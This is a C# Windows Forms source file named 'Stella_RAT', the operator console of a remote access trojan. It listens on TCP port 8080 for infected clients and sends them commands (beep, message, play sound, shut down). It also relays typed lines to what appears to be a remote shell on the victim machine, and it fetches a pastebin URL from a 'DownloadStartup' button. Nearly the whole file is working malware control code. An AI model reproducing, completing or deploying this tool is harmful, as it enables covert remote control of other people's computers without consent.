using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Stella_RAT
{
    public partial class Form1 : Form


    {

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
        (
            int nLeftRect,     // x-coordinate of upper-left corner
            int nTopRect,      // y-coordinate of upper-left corner
            int nRightRect,    // x-coordinate of lower-right corner
            int nBottomRect,   // y-coordinate of lower-right corner
            int nWidthEllipse, // width of ellipse
            int nHeightEllipse // height of ellipse
        );

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();


        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        StringBuilder strInput;
        Thread th_StartListen, th_RunServer;

        //Commands in enumeration format:
        private enum command
        {
            HELP = 1,
            MESSAGE = 2,
            BEEP = 3,
            PLAYSOUND = 4,
            SHUTDOWNCLIENT = 5
        }
        public Form1()
        {
            InitializeComponent();      
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            textBox1.Hide();
            CloseRS.Hide();
            th_StartListen = new Thread(new ThreadStart(StartListen));
            th_StartListen.Start();
            textBox2.Focus();

        }

        private void StartListen()
        {
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 8080);
            tcpListener.Start();
            toolStripStatusLabel1.Text = "Listening on port 8080 ...";
            for (; ; )
            {
                socketForClient = tcpListener.AcceptSocket();
                IPEndPoint ipend = (IPEndPoint)socketForClient.RemoteEndPoint;
                toolStripStatusLabel1.Text = "Connection from " + IPAddress.Parse(ipend.Address.ToString());
                th_RunServer = new Thread(new ThreadStart(RunServer));
                th_RunServer.Start();
            }
        }
        private void RunServer()
        {
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);
            strInput = new StringBuilder();

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\r\n");
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
                Application.DoEvents();
                DisplayMessage(strInput.ToString());
                strInput.Remove(0, strInput.Length);
            }
        }


        private void Cleanup()
        {
            try
            {
                streamReader.Close();
                streamWriter.Close();
                networkStream.Close();
                socketForClient.Close();
            }
            catch (Exception err) { }
            toolStripStatusLabel1.Text = "Connection Lost";
        }


        private delegate void DisplayDelegate(string message);

        private void DisplayMessage(string message)
        {
            if (textBox1.InvokeRequired)
            {
                Invoke(new DisplayDelegate(DisplayMessage), new object[] { message });
            }
            else
            {
                if (textBox1.Text == "Waiting For Client To Connect...")
                {
                    textBox1.Clear();
                }

                textBox1.AppendText(message);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("" + (int)command.BEEP);
            streamWriter.Flush();
        }

        private void toolStripStatusLabel1_Click(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                streamWriter.WriteLine("" + (int)command.SHUTDOWNCLIENT);
                streamWriter.Flush();
                toolStripStatusLabel1.Text = "Client has been shut down";
            }

            catch
            {

            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {


                streamWriter.WriteLine("" + (int)command.PLAYSOUND);
                streamWriter.Flush();
            }
            catch
            {

            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                streamWriter.WriteLine("" + (int)command.MESSAGE);
                streamWriter.Flush();
            }

            catch
            {

            }

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {
                    strInput.Append(textBox2.Text.ToString());
                    streamWriter.WriteLine(strInput);
                    streamWriter.Flush();
                    strInput.Remove(0, strInput.Length);
                    if (textBox2.Text == "exit") Cleanup();
                    if (textBox2.Text == "terminate") Cleanup();
                    if (textBox2.Text == "cls") textBox1.Text = "";
                    textBox2.Text = "";
                }
            }
            catch (Exception err) { }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Cleanup();
            System.Environment.Exit(0);
        }

        private void CloseRS_Click(object sender, EventArgs e)
        {
            textBox1.Hide();
            StartRS.Show();
            CloseRS.Hide();
        }

        private void StartRS_Click(object sender, EventArgs e)
        {
            textBox1.Show();
            CloseRS.Show();
            StartRS.Hide();

        }

        private void DownloadStartup_Click(object sender, EventArgs e)
        {
            string address = "https://pastebin.com/raw/ppLG5QQQ";
            WebClient client = new WebClient();
            string reply = client.DownloadString(address);
            string[] tokens = reply.Split(':');


        }

        private void rjButton2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void rjButton5_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;

        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void StartRS_Click_1(object sender, EventArgs e)
        {
            textBox1.Show();
            CloseRS.Show();
            StartRS.Hide();
        }

        private void CloseRS_Click_1(object sender, EventArgs e)
        {
            textBox1.Hide();
            StartRS.Show();
            CloseRS.Hide();
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }
    }
}
